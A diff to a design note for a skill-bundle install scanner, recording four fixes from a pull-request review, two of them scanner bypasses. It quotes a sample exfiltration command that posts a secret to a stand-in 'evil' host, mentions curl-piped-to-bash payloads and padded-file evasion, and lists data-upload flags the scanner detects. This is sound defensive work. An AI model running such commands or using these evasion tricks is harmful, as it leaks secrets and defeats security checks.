@@ -77,6 +77,27 @@ the baseline blocks none. `sys.exit(1)` on regression. Satisfies the issue's KPI
 - CLI: `omegaclaw-skills scan <benign>` → CLEAN, exit 0; `scan <curl|bash bundle>` → BLOCKED,
   exit 1.
 
+### Post-review fix (PR #38 review) — 4 blockers (2 scanner bypasses + 2 contract)
+1. **`curl -d`/POST exfil regex was broken** — `\b-d\b` never matches ` -d` (space→`-` is not a
+   word boundary), so `curl -d "$SECRET" https://evil/collect` installed. **Fix:** match
+   data-upload flags with `\s` before the flag — `-d`/`--data*`/`-F`/`--form`/`-T`/`--upload-file`/
+   `-X POST`, plus `wget --post-*` and `requests.(post|put|patch)`. Benign `curl … GET -o` stays
+   unflagged.
+2. **Files > cap silently skipped** — a padded `big.sh` with trailing `curl|bash` installed
+   `clean`. **Fix:** raise the full-scan cap to 2 MiB and, beyond it, scan a **head+tail window**
+   (catches prepended/appended payloads) AND emit a MEDIUM `oversized_unscanned` finding — never
+   silently clean.
+3. **`OMEGACLAW_INSTALL_INTERACTIVE` exposed but not implemented** — `decide()` returned
+   `approve` but `install()` rejected everything `!= "allow"`. **Fix:** a real handoff —
+   `install(approve_high=…)` (CLI `install --approve`) commits an approved HIGH bundle with
+   `trust: approved`; without explicit approval a HIGH finding is still denied (fail-closed).
+4. **`scan` CLI reported missing/invalid/empty as CLEAN success** — unsafe for automation.
+   **Fix:** non-zero exit + surfaced loader errors for a nonexistent path, invalid bundles, or
+   zero discovered bundles (opt out with `--allow-empty`).
+Regression tests: `test_curl_data_post_exfil_is_high`, `test_oversized_support_file_tail_is_scanned`,
+`test_interactive_approval_handoff`, `test_scan_cli_fails_on_missing_invalid_and_empty`.
+install_policy suite now 10 tests; KPI gate + #12 gate still pass; 68-test sweep green.
+
 ## 6. Reviewer guide
 
 ```bash
